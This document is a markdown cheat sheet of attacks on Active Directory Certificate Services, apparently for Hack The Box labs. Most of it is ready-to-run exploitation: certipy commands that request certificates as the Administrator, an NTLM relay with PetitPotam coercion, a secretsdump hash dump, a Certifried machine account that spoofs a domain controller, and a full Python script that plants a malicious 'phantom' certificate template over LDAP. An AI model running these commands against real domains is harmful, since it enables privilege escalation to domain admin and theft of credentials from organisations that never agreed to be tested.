# ADCS Certificate Attacks (ESC1-ESC16)

## Enumeration (always start here)
```bash
# Find all vulnerable templates
certipy find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
# OR on Kali if the binary is certipy-ad:
certipy-ad find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -enabled

# NetExec ADCS module
nxc ldap <DC> -u <user> -p '<pass>' -M adcs
```
**If no templates are exploitable:** check your groups. `Template_Editors`,
`Cert Publishers`, or any group with **CreateChild** on the certificate
templates container → **phantom template attack** (see section below). Don't
conclude "CA dead end" until you check for phantoms.

## ESC1 -- Enrollee Supplies Subject Alternative Name
Template allows client auth + `ENROLLEE_SUPPLIES_SUBJECT`. Any user can
request a cert for any other user (e.g., Administrator).
```bash
# Request cert as Administrator
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' -upn 'administrator@<dom>'

# Authenticate with the cert
certipy auth -pfx administrator.pfx -dc-ip <DC>
# Output: NT hash for Administrator
```

## ESC4 -- WriteDACL/GenericAll on Template
Modify a template to become ESC1-vulnerable, exploit it, then restore.
```bash
# Save original config and make it ESC1-vulnerable
certipy template -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> \
  -template '<TEMPLATE>' -save-old

# Now exploit as ESC1 (see above)
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<TEMPLATE>' -upn 'administrator@<dom>'

# Restore original template config
certipy template -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> \
  -template '<TEMPLATE>' -configuration '<TEMPLATE>.json'
```

## ESC8 -- NTLM Relay to HTTP Enrollment
The CA's web enrollment endpoint accepts NTLM. Coerce a DC to authenticate,
relay to the CA, get a cert as the DC's machine account.
```bash
# Terminal 1: set up relay
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
# OR: certipy relay -target <CA> -template DomainController

# Terminal 2: coerce DC authentication
python3 petitpotam.py <ATTACKER-IP> <DC-IP>
# OR with creds:
python3 petitpotam.py -d <dom> -u <user> -p '<pass>' <ATTACKER-IP> <DC-IP>

# After relay captures cert:
certipy auth -pfx <captured>.pfx -dc-ip <DC>
```

## ESC13 -- Issuance Policy Linked to Privileged Group
An issuance policy OID is linked (via `msDS-OIDToGroupLink`) to a privileged
group. Enrolling in a template with that policy grants group membership in the
issued cert.
```bash
certipy find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
# Look for ESC13 in output, then standard enrollment
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<ESC13-TEMPLATE>'
certipy auth -pfx <cert>.pfx -dc-ip <DC>
```

## ESC15 / EKUwu (CVE-2024-49019)
Schema V1 template allows the enrollee to specify an application policy
(EKU) in the CSR. Inject Client Authentication EKU into a template that
normally wouldn't allow it. Patched Dec 2024 but exploitable on unpatched DCs.
```bash
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<V1-TEMPLATE>' \
  -application-policies '1.3.6.1.5.5.7.3.2'  # Client Authentication OID
certipy auth -pfx <cert>.pfx -dc-ip <DC>
```

## Authentication with certificates
```bash
# Get NT hash from PFX
certipy auth -pfx cert.pfx -dc-ip <DC>
# Output: <user> hash: <NTLM>

# Use the hash
nxc smb <DC> -u <user> -H <NTLM>
impacket-secretsdump '<dom>/<user>@<DC>' -hashes :<NTLM>

# PKINIT (get TGT from cert)
certipy auth -pfx cert.pfx -dc-ip <DC> -username <user> -domain <dom>
```

## Phantom Templates -- CA references templates that don't exist in AD

A CA is configured to issue certain template names, but the actual template
objects may not exist in AD. If you can **create** a template with that name
(and make it ESC1-vulnerable), the CA will happily issue from it.

**When to check:** whenever `certipy find` shows templates the CA publishes
but you can't enroll in any of them, OR your account is in a group like
`Template_Editors` / `Cert Publishers` / any group with **CreateChild** on the
certificate templates container. Don't conclude "CA is a dead end" until you
check for phantoms.

### Step 1: Find phantom template names
Compare what the CA says it can issue vs what actually exists in AD:
```bash
# Python one-liner (ldap3 must be installed):
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
import sys
s = Server(sys.argv[1], get_info=ALL)
c = Connection(s, user=sys.argv[2], password=sys.argv[3], authentication=NTLM)
c.bind()
base = s.info.other['defaultNamingContext'][0]
conf = 'CN=Configuration,' + base
# Templates the CA is configured to issue
c.search('CN=Enrollment Services,CN=Public Key Services,CN=Services,' + conf,
         '(objectClass=pKIEnrollmentService)',
         attributes=['certificateTemplates','cn'])
for ca in c.entries:
    ca_list = set(ca['certificateTemplates'].values)
    # Templates that actually exist as AD objects
    c.search('CN=Certificate Templates,CN=Public Key Services,CN=Services,' + conf,
             '(objectClass=pKICertificateTemplate)', attributes=['cn'])
    real = {str(e['cn']) for e in c.entries}
    missing = ca_list - real
    if missing:
        print(f'CA [{ca[\"cn\"]}] references templates that DO NOT EXIST in AD:')
        for t in sorted(missing): print(f'  -> {t}  (PHANTOM -- can be created)')
    else:
        print(f'CA [{ca[\"cn\"]}]: all published templates exist')
" '<DC>' '<DOM>\<user>' '<pass>'
```

### Step 2: Check if you can create templates
Your account needs **CreateChild** on the Certificate Templates container.
Groups like `Template_Editors` typically have this. Check with:
```bash
# impacket dacledit or bloodyAD:
bloodyAD -d <dom> -u <user> -p '<pass>' --host <DC> \
  get object 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<d1>,DC=<d2>' \
  --attr nTSecurityDescriptor

# Or check group membership -- Template_Editors usually has CreateChild
nxc ldap <DC> -u <user> -p '<pass>' --query '(cn=Template_Editors)' '' | grep member
```

### Step 3: Create the phantom template as ESC1-vulnerable
Build the template object via LDAP. The name MUST match one the CA publishes:
```python
#!/usr/bin/env python3
"""Create a phantom certificate template with ESC1 properties."""
from ldap3 import Server, Connection, NTLM, ALL, MODIFY_ADD
import struct, sys

DC, CRED, PASS, DOMAIN = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
TEMPLATE_NAME = sys.argv[5]  # must match a phantom name from Step 1

s = Server(DC, get_info=ALL)
c = Connection(s, user=f'{DOMAIN}\\{CRED}', password=PASS, authentication=NTLM)
c.bind()

base = s.info.other['defaultNamingContext'][0]
conf = 'CN=Configuration,' + base
tmpl_dn = f'CN={TEMPLATE_NAME},CN=Certificate Templates,CN=Public Key Services,CN=Services,{conf}'

# Lookup our SID for enrollment ACL (allow Authenticated Users to enroll)
AUTH_USERS_SID = b'\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'  # S-1-5-11

# Minimal SD granting Authenticated Users Enroll (0x00000004) + AutoEnroll
# In practice, use a permissive SD or copy from an existing template
attrs = {
    'objectClass': ['top', 'pKICertificateTemplate'],
    'cn': TEMPLATE_NAME,
    'displayName': TEMPLATE_NAME,
    'msPKI-Cert-Template-OID': '1.3.6.1.4.1.311.21.8.1.1.1.1.1.1',  # adjust if OID conflict
    'msPKI-Certificate-Name-Flag': '1',        # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1!)
    'msPKI-Enrollment-Flag': '0',              # no manager approval
    'msPKI-Private-Key-Flag': '16842752',      # exportable
    'msPKI-RA-Signature': '0',                 # no RA cosign
    'msPKI-Minimal-Key-Size': '2048',
    'msPKI-Template-Schema-Version': '2',
    'msPKI-Template-Minor-Revision': '0',
    'pKIDefaultKeySpec': '1',                  # AT_KEYEXCHANGE
    'pKIMaxIssuingDepth': '0',
    'pKIExpirationPeriod': b'\x00\x80\x1a\x06\x00\x14\x00\x00',   # 1 year
    'pKIOverlapPeriod':    b'\x00\x80\xa6\x0a\x02\x00\x00\x00',   # 6 weeks
    'pKIExtendedKeyUsage': '1.3.6.1.5.5.7.3.2',  # Client Authentication
    'revision': '100',
    'flags': '131680',  # CT_FLAG_ADD_EMAIL | CT_FLAG_PUBLISH_TO_DS (non-critical)
}
c.add(tmpl_dn, attributes=attrs)
print(f'Template creation: {c.result}')

# Grant Authenticated Users enrollment rights (Extended Right: Enroll)
# For a quick test, set a permissive DACL:
print('If SD is restricted, manually grant Enroll to your user/group.')
print(f'Template DN: {tmpl_dn}')
print(f'Now exploit with: certipy req ... -template {TEMPLATE_NAME} -upn administrator@{DOMAIN}')
```

### Step 4: Exploit as ESC1
```bash
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<PHANTOM-TEMPLATE>' -upn 'administrator@<dom>'
certipy auth -pfx administrator.pfx -dc-ip <DC>
```

**Cleanup:** delete the template object after exploitation to restore the
original state:
```bash
python3 -c "
from ldap3 import Server, Connection, NTLM
s = Server('<DC>')
c = Connection(s, user='<dom>\\\\<user>', password='<pass>', authentication=NTLM)
c.bind()
c.delete('CN=<TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<d1>,DC=<d2>')
print(c.result)
"
```

## Other ESC variants (less common on HTB)
- **ESC2**: Template allows `Any Purpose` or `SubCA` EKU.
- **ESC3**: Certificate Request Agent template (enroll on behalf of others).
- **ESC6**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (SAN in any request).
- **ESC7**: Manage CA / Manage Certificates rights on CA itself.
- **ESC9/ESC10**: `CT_FLAG_NO_SECURITY_EXTENSION` / weak cert mapping.
- **ESC11**: NTLM relay to ICertPassage (RPC enrollment, no HTTP needed).

- **Certifried (CVE-2022-26923)**: machine account's `dNSHostName` set to
  match a DC's, then request a Machine template cert. The cert authenticates
  as the DC. Patched May 2022 but exploitable on unpatched DCs.
  ```bash
  certipy account create -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> \
    -user 'EVIL$' -pass 'P@ss123' -dns '<DC-FQDN>'
  certipy req -u 'EVIL$@<dom>' -p 'P@ss123' -dc-ip <DC> -target <CA-HOST> \
    -ca '<CA-NAME>' -template Machine
  certipy auth -pfx evil.pfx -dc-ip <DC>
  ```

All detectable with `certipy find -vulnerable`.
